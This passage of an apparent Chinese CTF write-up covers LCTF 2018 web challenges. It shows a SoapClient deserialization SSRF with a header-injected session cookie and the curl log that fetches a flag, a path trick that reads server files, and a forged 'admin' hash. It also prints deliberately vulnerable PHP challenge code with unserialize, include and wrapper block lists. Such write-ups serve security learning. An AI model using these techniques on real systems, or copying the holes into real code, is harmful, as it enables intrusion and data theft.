string(23) &quot;welcome_to_the_lctf2018&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="通过SoapClient调用不存在的方法，触发反序列化"><a href="#通过SoapClient调用不存在的方法，触发反序列化" class="headerlink" title="通过SoapClient调用不存在的方法，触发反序列化."></a>通过SoapClient调用不存在的方法，触发反序列化.</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$arrayName = array(&apos;name&apos; =&gt; &apos;Soapclient&apos;);</span><br><span class="line">	$a = array(reset($arrayName), &apos;welcome_to_the_lctf&apos;);</span><br><span class="line">	call_user_func(&apos;call_user_func&apos;, $a);</span><br></pre></td></tr></table></figure>
+<p>结果:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:/var/www/html/best_lctf$ php test.php </span><br><span class="line">PHP Warning:  call_user_func() expects parameter 1 to be a valid callback, class &apos;SoapClient&apos; does not have a method &apos;welcome_to_the_lctf&apos; in /var/www/html/best_lctf/test.php on line 4</span><br></pre></td></tr></table></figure>
+<h3 id="getFlag"><a href="#getFlag" class="headerlink" title="getFlag:"></a>getFlag:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">ht@TIANJI:/mnt/c/Users/HT/Desktop/lctf$ curl -v -d &quot;b=call_user_func&quot; -b &quot;PHPSESSID=5rtososkghp97ud5fgupgpk014&quot; &quot;http://192.168.21.143/best_lctf/index.php?f=extract&quot;</span><br><span class="line">*   Trying 192.168.21.143...</span><br><span class="line">* Connected to 192.168.21.143 (192.168.21.143) port 80 (#0)</span><br><span class="line">&gt; POST /best_lctf/index.php?f=extract HTTP/1.1</span><br><span class="line">&gt; Host: 192.168.21.143</span><br><span class="line">&gt; User-Agent: curl/7.47.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; Cookie: PHPSESSID=5rtososkghp97ud5fgupgpk014</span><br><span class="line">&gt; Content-Length: 16</span><br><span class="line">&gt; Content-Type: application/x-www-form-urlencoded</span><br><span class="line">&gt;</span><br><span class="line">* upload completely sent off: 16 out of 16 bytes</span><br><span class="line">* HTTP 1.0, assume close after body</span><br><span class="line">&lt; HTTP/1.0 500 Internal Server Error</span><br><span class="line">&lt; Date: Tue, 20 Nov 2018 03:41:06 GMT</span><br><span class="line">&lt; Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">&lt; Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line">&lt; Pragma: no-cache</span><br><span class="line">&lt; Content-Length: 3037</span><br><span class="line">&lt; Connection: close</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt;</span><br><span class="line">&lt;code&gt;&lt;span style=&quot;color: #000000&quot;&gt;</span><br><span class="line">&lt;span style=&quot;color: #0000BB&quot;&gt;&amp;lt;?php&lt;br /&gt;highlight_file&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;__FILE__&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;);&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$b&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color: #DD0000&quot;&gt;&apos;implode&apos;&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;;&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;call_user_func&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$_GET&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;f&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;],&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$_POST&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;);&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;session_start&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;();&lt;br /&gt;if(isset(&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$_GET&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;]))&#123;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$_SESSION&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;]&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$_GET&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;];&lt;br /&gt;&#125;&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;var_dump&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$_SESSION&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;);&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$a&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;=&amp;nbsp;array(&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;reset&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$_SESSION&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;),&lt;/span&gt;&lt;span style=&quot;color: #DD0000&quot;&gt;&apos;welcome_to_the_lctf2018&apos;&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;);&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;var_dump&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$a&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;);&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;call_user_func&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$b&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$a&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;);&lt;br /&gt;&lt;/span&gt;</span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;/code&gt;array(1) &#123;</span><br><span class="line">  [&quot;a:1:&#123;s:4:&quot;name&quot;;s:236:&quot;&quot;]=&gt;</span><br><span class="line">  object(SoapClient)#1 (5) &#123;</span><br><span class="line">    [&quot;uri&quot;]=&gt;</span><br><span class="line">    string(3) &quot;123&quot;</span><br><span class="line">    [&quot;location&quot;]=&gt;</span><br><span class="line">    string(35) &quot;http://127.0.0.1/best_lctf/flag.php&quot;</span><br><span class="line">    [&quot;_stream_context&quot;]=&gt;</span><br><span class="line">    int(0)</span><br><span class="line">    [&quot;_user_agent&quot;]=&gt;</span><br><span class="line">    string(56) &quot;N0rth3ty</span><br><span class="line">Cookie: PHPSESSID=a0sdtk0pk3gcf2jovjskkcp0n6</span><br><span class="line">&quot;</span><br><span class="line">    [&quot;_soap_version&quot;]=&gt;</span><br><span class="line">    int(1)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  object(SoapClient)#1 (5) &#123;</span><br><span class="line">    [&quot;uri&quot;]=&gt;</span><br><span class="line">    string(3) &quot;123&quot;</span><br><span class="line">    [&quot;location&quot;]=&gt;</span><br><span class="line">    string(35) &quot;http://127.0.0.1/best_lctf/flag.php&quot;</span><br><span class="line">    [&quot;_stream_context&quot;]=&gt;</span><br><span class="line">    int(0)</span><br><span class="line">    [&quot;_user_agent&quot;]=&gt;</span><br><span class="line">    string(56) &quot;N0rth3ty</span><br><span class="line">Cookie: PHPSESSID=a0sdtk0pk3gcf2jovjskkcp0n6</span><br><span class="line">&quot;</span><br><span class="line">    [&quot;_soap_version&quot;]=&gt;</span><br><span class="line">    int(1)</span><br><span class="line">  &#125;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(23) &quot;welcome_to_the_lctf2018&quot;</span><br><span class="line">&#125;</span><br><span class="line">* Closing connection 0</span><br></pre></td></tr></table></figure>
+<p>### </p>
+<h2 id="L-playground2"><a href="#L-playground2" class="headerlink" title="L playground2"></a>L playground2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import os</span><br><span class="line">http_schema = re.compile(r&quot;https?&quot;)</span><br><span class="line">url_parser = re.compile(r&quot;(\w+)://([\w\-@\.:]+)/?([\w/_\-@&amp;\?\.=%()]+)?(#[\w\-@&amp;_\?()/%]+)?&quot;)</span><br><span class="line">base_dir = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">sandbox_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), &quot;sandbox&quot;)</span><br><span class="line">def parse_file(path):</span><br><span class="line">    filename = os.path.join(sandbox_dir, path)</span><br><span class="line">    if &quot;./&quot; in filename or &quot;..&quot; in filename:</span><br><span class="line">        return &quot;invalid content in url&quot;</span><br><span class="line">    if not filename.startswith(base_dir):</span><br><span class="line">        return &quot;url have to start with %s&quot; % base_dir</span><br><span class="line">    if filename.endswith(&quot;py&quot;) or &quot;flag&quot; in filename:</span><br><span class="line">        return &quot;invalid content in filename&quot;</span><br><span class="line">    if os.path.isdir(filename):</span><br><span class="line">        file_list = os.listdir(filename)</span><br><span class="line">        return &quot;, &quot;.join(file_list)</span><br><span class="line">    elif os.path.isfile(filename):</span><br><span class="line">        with open(filename, &quot;rb&quot;) as f:</span><br><span class="line">            content = f.read()</span><br><span class="line">        return content</span><br><span class="line">    else:</span><br><span class="line">        return &quot;can&apos;t find file&quot;</span><br><span class="line">        </span><br><span class="line">def parse(url):</span><br><span class="line">    fragments = url_parser.findall(url)</span><br><span class="line">    if len(fragments) != 1 or len(fragments[0]) != 4:</span><br><span class="line">        return(&quot;invalid url&quot;)</span><br><span class="line">    schema = fragments[0][0]</span><br><span class="line">    host = fragments[0][1]</span><br><span class="line">    path = fragments[0][2]</span><br><span class="line">    if http_schema.match(schema):</span><br><span class="line">        return &quot;It&apos;s a valid http url&quot;</span><br><span class="line">    elif schema == &quot;file&quot;:</span><br><span class="line">        if host != &quot;sandbox&quot;:</span><br><span class="line">            return &quot;wrong file path&quot;</span><br><span class="line">        return parse_file(path)</span><br><span class="line">    else:</span><br><span class="line">        return &quot;unknown schema&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/sandbox&apos;)</span><br><span class="line">def render_static():</span><br><span class="line">    url = request.args.get(&quot;url&quot;)</span><br><span class="line">    try:</span><br><span class="line">        if url is None or url == &quot;&quot;:</span><br><span class="line">            content = &quot;no url input&quot;</span><br><span class="line">        else:</span><br><span class="line">            content = parse(url)</span><br><span class="line">        resp = make_response(content)</span><br><span class="line">    except Exception:</span><br><span class="line">        resp = make_response(&quot;url error&quot;)</span><br><span class="line">    resp.mimetype = &quot;text/plain&quot;</span><br><span class="line">    return resp</span><br></pre></td></tr></table></figure>
+<h3 id="os-path-join特性："><a href="#os-path-join特性：" class="headerlink" title="os.path.join特性："></a><code>os.path.join</code>特性：</h3><p>通过os.path.join特性, 实现读取/var/www/project/playground目录/文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ht@TIANJI:~/.ssh$ python</span><br><span class="line">Python 2.7.12 (default, Dec  4 2017, 14:50:18)</span><br><span class="line">[GCC 5.4.0 20160609] on linux2</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; os.path.join(&apos;/etc&apos;, &apos;/passwd&apos;)</span><br><span class="line">&apos;/passwd&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://212.64.7.239/sandbox?url=file://sandbox//var/www/project/playground/__pycache__&amp;token=LRXfAXOKKIiR6y0hkqZ9VmbiO5Pkguhn09OVvwF/S5jZ9nJ4w0abYS5ADGreQd9mENGxPUQ4OLrtPOh7vuXCXBqQ/BHAyiwWONd01jW0ONdLSyLOI/fy3sr+lIvGei5ue9wd/XqM9WawN26tpaZ372nitSp6ZONiO1VGFtgwdmpgwMvUlZPgzj5vcgGRSNFj</span><br></pre></td></tr></table></figure>
+<p>main.py:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    user = request.cookies.get(&apos;user&apos;, &apos;&apos;)</span><br><span class="line">    try:</span><br><span class="line">        username = session_decode(user)</span><br><span class="line">    except Exception:</span><br><span class="line">        username = get_username()</span><br><span class="line">        content = escape(username)</span><br><span class="line">    else:</span><br><span class="line">        if username == &apos;admin&apos;:</span><br><span class="line">            content = escape(FLAG)</span><br><span class="line">        else:</span><br><span class="line">            content = escape(username)</span><br><span class="line"></span><br><span class="line">    resp = make_response(render_template(&apos;main.html&apos;, content=content))</span><br><span class="line">    return resp</span><br></pre></td></tr></table></figure>
+<p>hash.py的MDA:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class MDA:</span><br><span class="line">    def insert(self, inBuf):</span><br><span class="line">        self.init()</span><br><span class="line">        self.update(inBuf)</span><br><span class="line">    def grouping(self, inBufGroup):</span><br><span class="line">        hexdigest_group = &apos;&apos;</span><br><span class="line">        for inBuf in inBufGroup:</span><br><span class="line">            self.insert(inBuf)</span><br><span class="line">            hexdigest_group += self.hexdigest()</span><br></pre></td></tr></table></figure>
+<p><code>grouping</code> 把 <code>inBufGroup</code> 中的每个字符都单独计算hash，因此前后字符对应的hash是无关联的。所以，找到<code>admin</code>对应的hash，即找 a, d, m, i, n 每个字符对应的hash。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">aYKp9</span><br><span class="line">b962d95efd252479</span><br><span class="line">e630b0372a4c511f</span><br><span class="line">8c6a8874d01df770</span><br><span class="line">414ec94d852dac00</span><br><span class="line">0c61993750547727</span><br><span class="line"></span><br><span class="line">KdA0k</span><br><span class="line">8c6a8874d01df770</span><br><span class="line">84407154c863ef36</span><br><span class="line">af028d5ff3351a09</span><br><span class="line">ee2d222f32215974</span><br><span class="line">85281413c94bf01e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FemI5</span><br><span class="line">0c13310650467719</span><br><span class="line">4c38032c903bb70e</span><br><span class="line">e80346042c47531a</span><br><span class="line">2575a34f6948901b</span><br><span class="line">6a45a255ae48d51b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JeeiR</span><br><span class="line">c451045c08252f78</span><br><span class="line">4c38032c903bb70e</span><br><span class="line">4c38032c903bb70e</span><br><span class="line">6e1beb0db216d969</span><br><span class="line">6b042d0caf7bd64e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">85K0n</span><br><span class="line">4428201f883baf0e</span><br><span class="line">6a45a255ae48d51b</span><br><span class="line">8c6a8874d01df770</span><br><span class="line">ee2d222f32215974</span><br><span class="line">b020cd1cf4031b57</span><br><span class="line"></span><br><span class="line">MFSG22LO.b962d95efd25247984407154c863ef36e80346042c47531a6e1beb0db216d969b020cd1cf4031b57</span><br></pre></td></tr></table></figure>
+<h2 id="sh0w-m3-the-sh31l-4ga1n"><a href="#sh0w-m3-the-sh31l-4ga1n" class="headerlink" title="sh0w m3 the sh31l 4ga1n"></a>sh0w m3 the sh31l 4ga1n</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">$SECRET  = `../read_secret`;                                   </span><br><span class="line">$SANDBOX = &quot;../data/&quot; . md5($SECRET. $_SERVER[&quot;REMOTE_ADDR&quot;]); </span><br><span class="line">$FILEBOX = &quot;../file/&quot; . md5(&quot;K0rz3n&quot;. $_SERVER[&quot;REMOTE_ADDR&quot;]);    </span><br><span class="line">@mkdir($SANDBOX); </span><br><span class="line">@mkdir($FILEBOX); </span><br><span class="line"></span><br><span class="line">if (!isset($_COOKIE[&quot;session-data&quot;])) &#123; </span><br><span class="line">    $data = serialize(new User($SANDBOX)); </span><br><span class="line">    $hmac = hash_hmac(&quot;md5&quot;, $data, $SECRET); </span><br><span class="line">    setcookie(&quot;session-data&quot;, sprintf(&quot;%s-----%s&quot;, $data, $hmac));       </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class User &#123; </span><br><span class="line">    public $avatar; </span><br><span class="line">    function __construct($path) &#123; </span><br><span class="line">        $this-&gt;avatar = $path;                                           </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class K0rz3n_secret_flag &#123; </span><br><span class="line">    protected $file_path; </span><br><span class="line">    function __destruct()&#123; </span><br><span class="line">        if(preg_match(&apos;/(log|etc|session|proc|data|read_secret|history|class|\.\.)/i&apos;, $this-&gt;file_path))&#123; </span><br><span class="line">            die(&quot;Sorry Sorry Sorry&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    include_once($this-&gt;file_path); </span><br><span class="line"> &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">function check_session() &#123; </span><br><span class="line">    global $SECRET; </span><br><span class="line">    $data = $_COOKIE[&quot;session-data&quot;]; </span><br><span class="line">    list($data, $hmac) = explode(&quot;-----&quot;, $data, 2); </span><br><span class="line">    if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac))&#123; </span><br><span class="line">        die(&quot;Bye&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">    if ( !hash_equals(hash_hmac(&quot;md5&quot;, $data, $SECRET), $hmac) )&#123; </span><br><span class="line">        die(&quot;Bye Bye&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">    $data = unserialize($data); </span><br><span class="line"></span><br><span class="line">    if ( !isset($data-&gt;avatar) )&#123; </span><br><span class="line">        die(&quot;Bye Bye Bye&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">    return $data-&gt;avatar;                                                </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">function upload($path) &#123; </span><br><span class="line">    if(isset($_GET[&apos;url&apos;]))&#123; </span><br><span class="line">         if(preg_match(&apos;/^(http|https).*/i&apos;, $_GET[&apos;url&apos;]))&#123; </span><br><span class="line">            $data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;);                                                                                     </span><br><span class="line">            if (substr($data, 0, 6) !== &quot;GIF89a&quot;)&#123; </span><br><span class="line">                die(&quot;Fuck off&quot;); </span><br><span class="line">            &#125; </span><br><span class="line">            file_put_contents($path . &quot;/avatar.gif&quot;, $data); </span><br><span class="line">            die(&quot;Upload OK&quot;); </span><br><span class="line">        &#125;else&#123; </span><br><span class="line">            die(&quot;Hacker&quot;); </span><br><span class="line">        &#125;            </span><br><span class="line">    &#125;else&#123; </span><br><span class="line">        die(&quot;Miss the URL~~&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">function show($path) &#123; </span><br><span class="line">    if ( !is_dir($path) || !file_exists($path . &quot;/avatar.gif&quot;)) &#123; </span><br><span class="line">            </span><br><span class="line">        $path = &quot;/var/www&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">    header(&quot;Content-Type: image/gif&quot;); </span><br><span class="line">    die(file_get_contents($path . &quot;/avatar.gif&quot;));                      </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">function check($path)&#123; </span><br><span class="line">    if(isset($_GET[&apos;c&apos;]))&#123; </span><br><span class="line">        if(preg_match(&apos;/^(ftp|php|zlib|data|glob|phar|ssh2|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i&apos;,$_GET[&apos;c&apos;]))&#123; </span><br><span class="line">            die(&quot;Hacker Hacker Hacker&quot;); </span><br><span class="line">        &#125;else&#123; </span><br><span class="line">            $file_path = $_GET[&apos;c&apos;]; </span><br><span class="line">            list($width, $height, $type) = @getimagesize($file_path); </span><br><span class="line">            die(&quot;Width is ：&quot; . $width.&quot; px&lt;br&gt;&quot; . </span><br><span class="line">                &quot;Height is ：&quot; . $height.&quot; px&lt;br&gt;&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;else&#123; </span><br><span class="line">        list($width, $height, $type) = @getimagesize($path.&quot;/avatar.gif&quot;); </span><br><span class="line">        die(&quot;Width is ：&quot; . $width.&quot; px&lt;br&gt;&quot; . </span><br><span class="line">            &quot;Height is ：&quot; . $height.&quot; px&lt;br&gt;&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">function move($source_path,$dest_name)&#123; </span><br><span class="line">    global $FILEBOX; </span><br><span class="line">    $dest_path = $FILEBOX . &quot;/&quot; . $dest_name; </span><br><span class="line">    if(preg_match(&apos;/(log|etc|session|proc|root|secret|www|history|file|\.\.|ftp|php|phar|zlib|data|glob|ssh2|rar|ogg|expect|http|https)/i&apos;,$source_path))&#123; </span><br><span class="line">        die(&quot;Hacker Hacker Hacker&quot;); </span><br><span class="line">    &#125;else&#123; </span><br><span class="line">        if(copy($source_path,$dest_path))&#123; </span><br><span class="line">            die(&quot;Successful copy&quot;); </span><br><span class="line">        &#125;else&#123; </span><br><span class="line">            die(&quot;Copy failed&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; 